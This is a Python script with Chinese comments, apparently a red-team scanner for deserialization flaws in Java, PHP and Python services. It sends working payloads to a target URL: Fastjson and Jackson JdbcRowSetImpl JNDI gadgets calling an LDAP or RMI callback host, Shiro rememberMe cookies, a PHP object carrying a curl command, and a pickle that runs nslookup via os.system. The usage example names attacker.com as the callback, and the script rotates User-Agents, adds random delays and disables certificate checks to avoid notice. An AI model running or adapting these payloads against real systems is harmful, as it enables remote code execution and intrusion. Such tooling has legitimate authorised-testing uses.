#!/usr/bin/env python3
"""
反序列化漏洞检测工具
检测 Java 序列化数据（rO0AB Base64 特征）、PHP 序列化数据（O:N: 特征）、
Python pickle 数据，生成 DNS 外带检测 payload，支持 Fastjson/Jackson/Shiro 框架。
"""

import argparse
import base64
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 反反爬策略：随机 User-Agent 池（20+）
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

DELAY_MIN = 1.0
DELAY_MAX = 3.0


def random_delay():
    """随机延迟 1-3 秒"""
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))


def create_ssl_context():
    """创建 TLS 指纹伪装 SSL 上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS")
        except Exception:
            pass
        return ctx
    except Exception:
        return None


def build_headers(url, cookie=None, extra=None):
    """构建反反爬请求头"""
    parsed = urllib.parse.urlparse(url)
    referer = parsed.scheme + "://" + parsed.netloc + "/" if parsed.netloc else url
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": referer,
        "Connection": "keep-alive",
    }
    if cookie:
        headers["Cookie"] = cookie
    if extra:
        headers.update(extra)
    return headers


def make_request(url, method="POST", data=None, cookie=None, proxy=None, timeout=10, content_type="application/json", extra_headers=None):
    """发起带反反爬策略的 HTTP 请求"""
    ctx = create_ssl_context()
    headers = build_headers(url, cookie, extra_headers)
    if content_type:
        headers["Content-Type"] = content_type
    post_data = None
    if data is not None:
        if isinstance(data, str):
            post_data = data.encode("utf-8")
        elif isinstance(data, bytes):
            post_data = data
    req = urllib.request.Request(url, data=post_data, headers=headers, method=method.upper())
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        handlers = [proxy_handler]
    else:
        handlers = []
    if ctx:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.getcode()
        resp_headers = dict(resp.headers)
        return status, body, resp_headers
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body, dict(e.headers) if e.headers else {}
    except Exception:
        return None, None, None


# ============================================================
# 序列化数据特征检测
# ============================================================

def detect_serialization_data(data):
    """检测数据中是否包含序列化特征"""
    detections = []

    # Java 序列化数据检测
    # 原始二进制: AC ED 00 05
    if isinstance(data, bytes):
        if data[:4] == b"\xac\xed\x00\x05":
            detections.append({
                "type": "java_binary",
                "description": "Java 原始序列化数据 (AC ED 00 05)",
                "raw_prefix": data[:20].hex(),
            })
    if isinstance(data, str):
        # Base64 编码: rO0AB 开头
        if data.startswith("rO0AB") or re.search(r"rO0AB[A-Za-z0-9+/=]+", data):
            detections.append({
                "type": "java_base64",
                "description": "Java Base64 序列化数据 (rO0AB 开头)",
                "encoded_prefix": data[:30],
            })
        # PHP 序列化数据: O:N:"classname"
        php_pattern = re.findall(r'O:\d+:"[^"]+"', data)
        if php_pattern:
            detections.append({
                "type": "php_serialized",
                "description": "PHP 序列化数据 (O:N:\"classname\")",
                "matches": php_pattern[:5],
            })
        # PHP 数组序列化: a:N:{...}
        if re.search(r'a:\d+:\{', data):
            detections.append({
                "type": "php_array",
                "description": "PHP 序列化数组 (a:N:{...})",
            })
        # Python pickle 数据
        if data.startswith("\x80\x04") or data.startswith("\x80\x03") or data.startswith("\x80\x02"):
            detections.append({
                "type": "python_pickle",
                "description": "Python pickle 数据",
            })
        # Base64 编码的 pickle
        if data.startswith("gASV") or data.startswith("gAR"):
            detections.append({
                "type": "python_pickle_b64",
                "description": "Python Base64 编码 pickle",
            })

    return detections


# ============================================================
# 反序列化 Payload 库
# ============================================================

def generate_fastjson_payloads(callback):
    """生成 Fastjson 检测 payload"""
    payloads = [
        {
            "name": "fastjson_jdbc_rowset",
            "payload": json.dumps({
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://{}/exp".format(callback),
                "autoCommit": True
            }),
            "description": "JdbcRowSetImpl LDAP 外带",
        },
        {
            "name": "fastjson_jdbc_rowset_rmi",
            "payload": json.dumps({
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://{}/exp".format(callback),
                "autoCommit": True
            }),
            "description": "JdbcRowSetImpl RMI 外带",
        },
        {
            "name": "fastjson_templates",
            "payload": json.dumps({
                "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
                "_bytecodes": ["yv66vg=="],
                "_name": "test",
                "_tfactory": {},
                "_outputProperties": {}
            }),
            "description": "TemplatesImpl 加载（需有效 bytecode）",
        },
    ]
    return payloads


def generate_jackson_payloads(callback):
    """生成 Jackson 检测 payload"""
    payloads = [
        {
            "name": "jackson_jdbc_rowset",
            "payload": json.dumps([
                "com.sun.rowset.JdbcRowSetImpl",
                {
                    "dataSourceName": "ldap://{}/exp".format(callback),
                    "autoCommit": True
                }
            ]),
            "description": "Jackson 多态反序列化 JdbcRowSetImpl",
        },
        {
            "name": "jackson_templates",
            "payload": json.dumps([
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
                {
                    "_bytecodes": ["yv66vg=="],
                    "_name": "test",
                    "_outputProperties": {}
                }
            ]),
            "description": "Jackson 多态 TemplatesImpl",
        },
    ]
    return payloads


def generate_shiro_payloads(callback):
    """生成 Shiro 检测 payload"""
    payloads = [
        {
            "name": "shiro_rememberme_detect",
            "payload": "rememberMe=test",
            "description": "Shiro rememberMe Cookie 检测（检查响应是否返回 deleteMe）",
            "is_cookie": True,
        },
        {
            "name": "shiro_rememberme_exploit",
            "payload": "rememberMe={}".format(base64.b64encode(b"\xac\xed\x00\x05test").decode()),
            "description": "Shiro 反序列化利用（需有效序列化数据）",
            "is_cookie": True,
        },
    ]
    return payloads


def generate_php_payloads(callback):
    """生成 PHP 反序列化检测 payload"""
    host = callback.split(":")[0] if ":" in callback else callback
    payloads = [
        {
            "name": "php_unserialize_file",
            "payload": 'O:8:"SplStack":0:{}',
            "description": "PHP SplStack 反序列化探测",
        },
        {
            "name": "php_unserialize_simple",
            "payload": 'O:4:"test":1:{{s:3:"cmd";s:{}:"curl http://{}/";}}'.format(host, len(host)),
            "description": "PHP 反序列化命令执行探测",
        },
    ]
    return payloads


def generate_python_payloads(callback):
    """生成 Python pickle 检测 payload"""
    host = callback.split(":")[0] if ":" in callback else callback
    payloads = [
        {
            "name": "pickle_dns_exfil",
            "payload": base64.b64encode(
                b"\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x8c\x06system\x93\x8c\x15nslookup "
                + host.encode() + b"\x85R."
            ).decode(),
            "description": "Python pickle DNS 外带 payload（Base64）",
        },
    ]
    return payloads


def scan_deser(url, data=None, header=None, callback=None, cookie=None, proxy=None, timeout=10):
    """反序列化漏洞扫描"""
    scan_result = {
        "url": url,
        "is_vulnerable": False,
        "data_detection": [],
        "framework_tests": [],
        "callback": callback,
    }

    # 检测现有数据中的序列化特征
    if data:
        detections = detect_serialization_data(data)
        scan_result["data_detection"] = detections
        if detections:
            scan_result["is_vulnerable"] = "potential"

    # 解析自定义 header
    extra_headers = {}
    if header:
        try:
            extra_headers = json.loads(header)
        except (json.JSONDecodeError, TypeError):
            # 支持 "Key: Value" 格式
            if ":" in header:
                parts = header.split(":", 1)
                extra_headers[parts[0].strip()] = parts[1].strip()

    # 如果提供了回调地址，生成框架检测 payload
    if callback:
        # Fastjson 测试
        for payload_info in generate_fastjson_payloads(callback):
            random_delay()
            status, body, _ = make_request(
                url, "POST", payload_info["payload"], cookie, proxy, timeout,
                "application/json", extra_headers
            )
            scan_result["framework_tests"].append({
                "framework": "Fastjson",
                "name": payload_info["name"],
                "payload": payload_info["payload"][:200],
                "description": payload_info["description"],
                "status_code": status,
                "note": "请检查回调服务器 {} 是否收到请求".format(callback),
                "body_snippet": (body or "")[:200],
            })

        # Jackson 测试
        for payload_info in generate_jackson_payloads(callback):
            random_delay()
            status, body, _ = make_request(
                url, "POST", payload_info["payload"], cookie, proxy, timeout,
                "application/json", extra_headers
            )
            scan_result["framework_tests"].append({
                "framework": "Jackson",
                "name": payload_info["name"],
                "payload": payload_info["payload"][:200],
                "description": payload_info["description"],
                "status_code": status,
                "note": "请检查回调服务器 {} 是否收到请求".format(callback),
                "body_snippet": (body or "")[:200],
            })

        # Shiro 测试
        for payload_info in generate_shiro_payloads(callback):
            random_delay()
            shiro_cookie = payload_info["payload"]
            status, body, resp_headers = make_request(
                url, "POST", data or "", cookie or "", proxy, timeout,
                "application/x-www-form-urlencoded", extra_headers
            )
            # 检查是否返回 deleteMe（Shiro 特征）
            set_cookie = resp_headers.get("Set-Cookie", "") if resp_headers else ""
            is_shiro = "deleteMe" in set_cookie
            scan_result["framework_tests"].append({
                "framework": "Shiro",
                "name": payload_info["name"],
                "payload": payload_info["payload"][:100],
                "description": payload_info["description"],
                "status_code": status,
                "is_shiro_detected": is_shiro,
                "set_cookie": set_cookie[:200],
            })
            if is_shiro:
                scan_result["is_vulnerable"] = True

        # PHP 反序列化测试
        for payload_info in generate_php_payloads(callback):
            random_delay()
            status, body, _ = make_request(
                url, "POST", payload_info["payload"], cookie, proxy, timeout,
                "application/x-www-form-urlencoded", extra_headers
            )
            scan_result["framework_tests"].append({
                "framework": "PHP",
                "name": payload_info["name"],
                "payload": payload_info["payload"][:200],
                "description": payload_info["description"],
                "status_code": status,
                "body_snippet": (body or "")[:200],
            })

        # Python pickle 测试
        for payload_info in generate_python_payloads(callback):
            random_delay()
            status, body, _ = make_request(
                url, "POST", payload_info["payload"], cookie, proxy, timeout,
                "application/octet-stream", extra_headers
            )
            scan_result["framework_tests"].append({
                "framework": "Python",
                "name": payload_info["name"],
                "payload": payload_info["payload"][:200],
                "description": payload_info["description"],
                "status_code": status,
                "note": "请检查 DNS 日志中是否出现 {}".format(callback.split(":")[0]),
                "body_snippet": (body or "")[:200],
            })
    else:
        # 无回调地址，只做被动检测
        random_delay()
        status, body, _ = make_request(
            url, "GET", None, cookie, proxy, timeout, None, extra_headers
        )
        if body:
            detections = detect_serialization_data(body)
            if detections:
                scan_result["response_detection"] = detections
                scan_result["is_vulnerable"] = "potential"

    return scan_result


def main():
    parser = argparse.ArgumentParser(
        description="反序列化漏洞检测工具 - Java/PHP/Python + Fastjson/Jackson/Shiro",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  %(prog)s --url http://example.com/api --data '{\"name\":\"test\"}'\n  %(prog)s --url http://example.com/api --callback attacker.com:8080\n  %(prog)s --url http://example.com/api --header 'Content-Type: application/json' --output result.json",
    )
    parser.add_argument("--url", required=True, help="目标 URL")
    parser.add_argument("--data", help="请求数据（POST body）")
    parser.add_argument("--header", help="自定义请求头（JSON 格式或 Key: Value 格式）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--callback", help="回调服务器地址（host:port），用于 DNS/HTTP 外带检测")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数（默认 10）")
    parser.add_argument("--proxy", help="代理地址（可选）")
    parser.add_argument("--cookie", help="Cookie 字符串（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        result = scan_deser(args.url, args.data, args.header, args.callback, args.cookie, args.proxy, args.timeout)
        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except KeyboardInterrupt:
        print(json.dumps({"error": "用户中断"}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"error": "扫描失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
